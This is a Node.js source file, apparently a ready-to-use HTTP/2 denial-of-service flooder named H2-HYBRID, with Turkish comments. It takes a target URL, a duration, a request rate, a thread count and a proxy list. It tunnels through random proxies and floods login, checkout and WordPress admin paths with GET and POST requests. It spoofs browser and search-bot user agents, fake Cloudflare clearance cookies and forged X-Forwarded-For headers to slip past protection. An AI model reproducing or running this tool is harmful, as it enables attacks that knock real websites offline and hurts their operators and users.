"use strict";

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

// Performans Ayarları
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`
    [!] H2-HYBRID - Optimized Method
    Kullanım: node H2-HYBRID.js [HEDEF] [SÜRE] [HIZ] [THREAD] [PROXY_DOSYASI]
    `);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

// --- GÜNCEL VE STRATEJİK PATH LİSTESİ ---
const paths = [
    "/", "/login", "/register", "/api/v1/user", "/contact", "/shop/checkout",
    "/cdn-cgi/l/chk_jschl", "/search?q=" + crypto.randomBytes(4).toString("hex"),
    "/wp-admin/admin-ajax.php", "/api/v2/track"
];

// --- GENİŞLETİLMİŞ COMBINED POOL (GERÇEKÇİ KARIŞIM) ---
const combinedPool = [
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="130"', bot: false },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", platform: "macOS", mobile: "?0", ch: '"Google Chrome";v="129"', bot: false },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", bot: false },
    { ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", platform: "Linux", bot: true },
    { ua: "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", platform: "Windows", bot: true },
    { ua: "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", platform: "Linux", bot: true }
];

const cipherList = ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-RSA-AES128-GCM-SHA256"];

if (cluster.isMaster) {
    console.log(`[!] Attack Started: ${args.target}`);
    console.log(`[!] Hybrid Mode | Method developed by Genisys`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => { process.exit(0); }, args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;
    const [proxyHost, proxyPort] = proxyAddr.split(":");

    const connection = net.connect(parseInt(proxyPort), proxyHost);
    connection.once("connect", () => {
        connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
    });

    connection.once("data", (chunk) => {
        if (!chunk.toString().includes("HTTP/1.1 200")) { connection.destroy(); return; }

        const tlsConn = tls.connect({
            socket: connection,
            servername: parsedTarget.hostname,
            ALPNProtocols: ["h2"],
            ciphers: cipherList.sort(() => Math.random() - 0.5).join(":"),
            minVersion: "TLSv1.2", // TLS 1.2 Zorunluluğu
            rejectUnauthorized: false
        });

        tlsConn.once("secureConnect", () => {
            const client = http2.connect(args.target, {
                createConnection: () => tlsConn,
                settings: { initialWindowSize: 6291456, maxFrameSize: 16384, enablePush: false }
            });

            client.on("connect", () => {
                const attackInterval = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const browser = combinedPool[Math.floor(Math.random() * combinedPool.length)];
                        const randomPath = paths[Math.floor(Math.random() * paths.length)];
                        
                        // %30 POST, %70 GET dengesi (Sunucu yükü için POST önemlidir)
                        const method = Math.random() > 0.7 ? "POST" : "GET";
                        
                        // AKILLI REFERER MANTIĞI
                        const referers = ["https://google.com", "https://bing.com", "https://t.co/", args.target];
                        let selectedReferer = browser.bot ? "" : referers[Math.floor(Math.random() * referers.length)];

                        // DİNAMİK COOKIE YÖNETİMİ
                        const cookieHeader = `cf_clearance=${crypto.randomBytes(32).toString("hex")}; _cfuvid=${crypto.randomBytes(16).toString("hex")}; __cf_bm=${crypto.randomBytes(20).toString("hex")}`;

                        const headers = {
                            ":method": method,
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": randomPath,
                            "user-agent": browser.ua,
                            "referer": selectedReferer,
                            "cookie": cookieHeader,
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8",
                            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1.1`,
                            "cache-control": "no-cache"
                        };

                        if (method === "POST") {
                            headers["content-type"] = "application/json";
                        }

                        if (!browser.bot) {
                            headers["sec-ch-ua"] = browser.ch;
                            headers["sec-fetch-dest"] = "document";
                            headers["sec-fetch-mode"] = "navigate";
                            headers["sec-fetch-site"] = selectedReferer ? "cross-origin" : "none";
                        }

                        const req = client.request(headers);

                        if (method === "POST") {
                            // Sunucu tarafında veritabanı/işlem yükü yaratacak dinamik JSON
                            req.write(JSON.stringify({
                                token: crypto.randomBytes(16).toString("hex"),
                                timestamp: Date.now(),
                                action: "verify_session",
                                browser_engine: "blink"
                            }));
                        }

                        req.on("response", () => { req.close(); req.destroy(); });
                        req.end();
                    }
                }, 1000);

                setTimeout(() => { 
                    clearInterval(attackInterval); 
                    client.close(); 
                    connection.destroy(); 
                }, 10000);
            });

            client.on("error", () => { client.destroy(); connection.destroy(); });
        });
    });

    connection.on("error", () => { connection.destroy(); });
}